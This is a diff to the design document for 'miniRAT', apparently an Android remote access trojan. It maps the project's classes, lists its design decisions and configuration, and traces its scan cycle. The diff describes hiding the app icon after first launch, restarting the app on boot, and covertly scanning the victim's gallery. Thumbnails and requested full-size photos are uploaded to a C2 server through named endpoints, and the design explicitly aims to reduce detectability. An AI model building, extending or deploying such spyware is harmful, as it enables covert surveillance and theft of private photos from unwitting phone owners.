@@ -7,15 +7,16 @@
 ## Codebase Map
 
 ```
-miniRAT/
-├── app/src/main/
-│   ├── AndroidManifest.xml             # Permissions + components
-│   └── java/com/app/minirat/
-│       ├── HiddenActivity.java         # [ENTRY] Permission → service → hide → finish
-│       ├── Service.java                # [CORE] Periodic scan + dedup + upload
-│       └── BootReceiver.java           # [PERSISTENCE] Restart on boot
-├── server.js                           # C2 server
-└── app/local.properties                # DOMAIN_URL config
+com.app.minirat/
+├── HiddenActivity.java         # [ENTRY] Permission → service → hide → finish
+├── Service.java                # [CORE] Lifecycle + scan scheduling
+├── GalleryScanner.java         # [DATA] MediaStore queries + image processing
+├── NetworkManager.java         # [NET] All HTTP communication
+├── UploadTracker.java          # [STATE] SharedPreferences deduplication
+├── MediaItem.java              # [MODEL] Data class (id, uri, name)
+└── BootReceiver.java           # [PERSIST] Restart on boot
+
+server.js                       # C2: routes + dashboard + request queue
 ```
 
 ---
@@ -24,61 +25,60 @@ miniRAT/
 
 | Decision | Rationale |
 |---|---|
+| **5-class refactor** | Single responsibility; Service.java orchestrates, delegates all work |
+| **Request queue** | On-demand full images without pre-uploading everything |
 | **Periodic 15-min scan** | Catches new photos; retries when server comes online |
-| **Server ping before scan** | No wasted battery/CPU when server is unreachable |
-| **SharedPreferences dedup** | Prevents re-uploading; survives process restarts |
-| **Stop on first failure** | If server goes down mid-scan, don't waste remaining uploads |
-| **Thumbnail-only** (128×128) | ~5-15 KB per image; low bandwidth footprint |
-| **ContentUris** | Scoped storage compatible on Android 10+ |
-| **Single-thread executor** | Sequential uploads; prevents OOM |
+| **Server ping before scan** | No wasted battery when server is down |
+| **SharedPreferences dedup** | Survives process restarts; prevents re-uploads |
+| **Break on first failure** | Partial scan success preserved; rest retried next cycle |
+| **Single background thread** | Sequential processing prevents OOM and reduces detectability |
 | **Per-cycle WakeLock** | Only active during scan; released immediately after |
-| **App drawer hiding** | `setComponentEnabledSetting(DISABLED)` after first launch |
+| **50MB JSON limit** | Full-res images need larger payload allowance |
+| **Request file persistence** | `requests.json` survives server restarts |
 
 ---
 
-## Component Roles
+## Scan Cycle Flow
 
-| Component | Responsibility | Lifecycle |
-|---|---|---|
-| `HiddenActivity` | Permission + service start + hide from drawer | First launch only |
-| `Service` | Periodic scan → dedup → server check → upload | Runs continuously |
-| `BootReceiver` | Restart service after reboot | On boot event |
-| `server.js` | Receive thumbnails, serve live dashboard | Always running |
+```
+Service.runScanCycle()
+├── network.isServerReachable()  → HEAD /api/thumbnails
+├── uploadNewThumbnails()
+│   ├── scanner.getAllImages()    → MediaStore query
+│   ├── tracker.isUploaded(id)   → SharedPreferences check
+│   ├── scanner.createThumbnail  → decode → scale → JPEG → Base64
+│   ├── network.uploadThumbnail  → POST /api/upload/thumbnail
+│   └── tracker.markAsUploaded   → persist ID
+└── fulfillFullImageRequests()
+    ├── network.getPendingRequests() → GET /api/requests
+    ├── scanner.findByName()     → MediaStore query by name
+    ├── scanner.readFullImage()  → decode → JPEG 90% → Base64
+    ├── network.uploadFullImage  → POST /api/upload/fullsize
+    └── network.markRequestFulfilled → DELETE /api/request/:file
+```
 
 ---
 
 ## Configuration
 
-| Property | File | Description |
+| Property | Location | Value |
 |---|---|---|
 | `DOMAIN_URL` | `app/local.properties` | C2 server URL |
-| Port `5000` | `server.js` | Server listen port |
-| `128×128` px | `Service.java` | Thumbnail resolution |
-| JPEG `70%` | `Service.java` | Compression quality |
-| `15 min` | `Service.java` | Scan interval (`SCAN_INTERVAL_MS`) |
-
----
-
-## Conventions
-
-| Area | Convention |
-|---|---|
-| Error handling | Exceptions caught at method boundaries, logged via `Log.e` |
-| Threading | Main thread: lifecycle + Handler timer. Background: single `ExecutorService` |
-| JSON | `org.json.JSONObject` for payload construction |
-| Bitmap | `inSampleSize` decoding + `recycle()` after use |
-| Media access | `ContentUris` + `ParcelFileDescriptor` |
-| Deduplication | `SharedPreferences.getStringSet()` for uploaded IDs |
-| Server check | HEAD request with 5s timeout |
+| Port | `server.js` | `5000` |
+| Scan interval | `Service.java` | `15 * 60 * 1000L` ms |
+| Thumbnail size | `GalleryScanner.java` | `128×128` px |
+| Thumbnail quality | `GalleryScanner.java` | JPEG `70%` |
+| Full image quality | `GalleryScanner.java` | JPEG `90%` |
+| JSON limit | `server.js` | `50mb` |
 
 ---
 
 ## Gotchas
 
-1. **First launch required** — App must be opened once for `BOOT_COMPLETED` and permissions
-2. **Permission denial** — MediaStore returns 0 results (no crash, just no images)
-3. **App icon gone** — After first launch, only reinstall or `adb` can re-trigger
-4. **SharedPreferences limit** — `StringSet` works fine for ~50K entries; beyond that consider SQLite
-5. **`local.properties` domain** — Must be set before building
-6. **Server going down mid-scan** — Upload stops, remaining images retry next cycle
-7. **OEM battery optimizations** — Some OEMs aggressively kill foreground services
+1. **First launch required** — Must open app once for permissions and boot receiver
+2. **Permission denial** — MediaStore returns 0 results silently
+3. **App icon gone** — After first launch, only reinstall can re-trigger
+4. **SharedPreferences limit** — StringSet fine up to ~50K IDs; beyond that use SQLite
+5. **Full image memory** — `readFullImage()` loads full bitmap into RAM; very large images could OOM
+6. **Request queue persistence** — `requests.json` is on server disk; survives restarts
+7. **Full image uploads** — Can be 5-10 MB each; ensure `express.json({ limit })` is sufficient
